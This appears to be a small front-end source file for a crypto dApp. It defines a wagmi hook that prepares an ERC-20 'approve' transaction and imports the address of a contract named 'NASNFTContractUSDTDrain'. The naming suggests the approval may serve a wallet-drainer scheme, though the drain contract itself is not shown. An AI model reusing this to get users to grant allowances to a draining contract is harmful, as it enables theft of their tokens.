import { useAccount, useContractWrite, usePrepareContractWrite,erc20ABI } from "wagmi";
import { YAUSDT_ADDRESS, NASNFTContractUSDTDrain_ADDRESS } from "./constants";

/**
 * Hook to get NASNFTContractUSDTDrainABI using wagmi
 */
export const useERC20Approve = () => {
  return useContractWrite({abi: erc20ABI, functionName: 'approve', address: YAUSDT_ADDRESS});
};
